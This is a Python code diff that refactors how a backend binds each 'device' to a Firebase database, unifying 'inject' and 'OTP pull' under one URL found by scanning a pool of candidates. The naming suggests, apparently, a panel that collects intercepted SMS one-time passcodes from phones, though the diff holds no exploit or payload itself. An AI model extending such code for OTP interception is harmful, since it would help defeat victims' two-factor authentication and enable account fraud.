@@ -279,10 +279,12 @@ def _firebase_url_candidates(profile: MonitorProfile, device: Device) -> list[st
     return out
 
 
-def _cache_sms_poll_url(device: Device, url: str, *, db=None) -> str:
+def _set_unified_device_panel(device: Device, url: str, *, db=None) -> str:
+    """Stable style: one Firebase for inject + OTP pull (device.firebase_source_url)."""
     from app.firebase_client import normalize_firebase_url
 
     norm = normalize_firebase_url(url)
+    device.firebase_source_url = norm
     meta = _meta_dict(device)
     meta[SMS_FIREBASE_URL_META_KEY] = norm
     meta[OTP_EMPTY_POLL_STREAK_META_KEY] = 0
@@ -299,7 +301,7 @@ async def resolve_firebase_url_for_otp_poll(
     *,
     force_pool_scan: bool = False,
 ) -> str | None:
-    """Firebase root that has messages/{device} — poll only; inject home stays on firebase_source_url."""
+    """Find messages/{device} across pool; set firebase_source_url (inject + pull same as stable)."""
     from app.firebase_client import normalize_firebase_url
 
     device_id = (device.name or "").strip()
@@ -313,10 +315,7 @@ async def resolve_firebase_url_for_otp_poll(
     if isinstance(cached, str) and cached.strip() and not force_pool_scan:
         cached_norm = normalize_firebase_url(cached)
         if await _messages_path_exists(cached_norm, device_id, timeout=timeout):
-            meta[OTP_EMPTY_POLL_STREAK_META_KEY] = 0
-            _save_meta(device, meta)
-            db.commit()
-            return cached_norm
+            return _set_unified_device_panel(device, cached_norm, db=db)
         meta.pop(SMS_FIREBASE_URL_META_KEY, None)
 
     home = (
@@ -326,12 +325,12 @@ async def resolve_firebase_url_for_otp_poll(
     )
     if home and not force_pool_scan:
         if await _messages_path_exists(home, device_id, timeout=timeout):
-            return _cache_sms_poll_url(device, home, db=db)
+            return _set_unified_device_panel(device, home, db=db)
 
     for url in _firebase_url_candidates(profile, device):
         if await _messages_path_exists(url, device_id, timeout=timeout):
-            logger.info("OTP poll panel resolved device=%s url=%s", device_id, url)
-            return _cache_sms_poll_url(device, url, db=db)
+            logger.info("Unified Firebase panel device=%s url=%s", device_id, url)
+            return _set_unified_device_panel(device, url, db=db)
 
     if force_pool_scan:
         meta.pop(POOL_SMS_SCAN_DONE_META_KEY, None)
@@ -341,8 +340,8 @@ async def resolve_firebase_url_for_otp_poll(
         if pool_hit:
             meta[POOL_SMS_SCAN_DONE_META_KEY] = True
             _save_meta(device, meta)
-            logger.info("OTP poll panel pool bind device=%s url=%s", device_id, pool_hit)
-            return _cache_sms_poll_url(device, pool_hit, db=db)
+            logger.info("Unified Firebase panel (pool) device=%s url=%s", device_id, pool_hit)
+            return _set_unified_device_panel(device, pool_hit, db=db)
         meta.pop(POOL_SMS_SCAN_DONE_META_KEY, None)
         _save_meta(device, meta)
         db.commit()
@@ -351,7 +350,7 @@ async def resolve_firebase_url_for_otp_poll(
     if candidates:
         url = normalize_firebase_url(candidates[0])
         logger.warning("OTP poll: no messages path yet device=%s — using %s", device_id, url)
-        return _cache_sms_poll_url(device, url, db=db)
+        return _set_unified_device_panel(device, url, db=db)
     return None
 
 
@@ -432,12 +431,12 @@ async def bind_sms_poll_panel_for_device(
         )
     if not url:
         return None
-    norm = _cache_sms_poll_url(device, url, db=None)
+    norm = _set_unified_device_panel(device, url, db=None)
     meta = _meta_dict(device)
     meta.pop(POOL_SMS_SCAN_DONE_META_KEY, None)
     _save_meta(device, meta)
     db.flush()
-    logger.info("SMS poll panel bound device=%s url=%s", device_id, norm)
+    logger.info("Unified Firebase bound device=%s url=%s", device_id, norm)
     return norm
 
 
@@ -493,14 +492,18 @@ async def _maybe_revalidate_firebase_poll_url(
 
 
 def _resolve_device_firebase_url(profile: MonitorProfile, device: Device) -> str | None:
+    """Same as stable: inject + poll use resolve_firebase_url → firebase_source_url."""
     from app.firebase_client import normalize_firebase_url
+    from app.firebase_sync import resolve_firebase_url
 
-    meta = _meta_dict(device)
-    cached = meta.get(SMS_FIREBASE_URL_META_KEY)
-    if isinstance(cached, str) and cached.strip():
-        return normalize_firebase_url(cached)
-    candidates = _firebase_url_candidates(profile, device)
-    return candidates[0] if candidates else None
+    url = resolve_firebase_url(profile, device)
+    if url:
+        return normalize_firebase_url(url)
+    if device.firebase_source_url:
+        return normalize_firebase_url(device.firebase_source_url)
+    if profile.firebase_url:
+        return normalize_firebase_url(profile.firebase_url)
+    return None
 
 
 def _meta_dict(device: Device) -> dict[str, Any]:
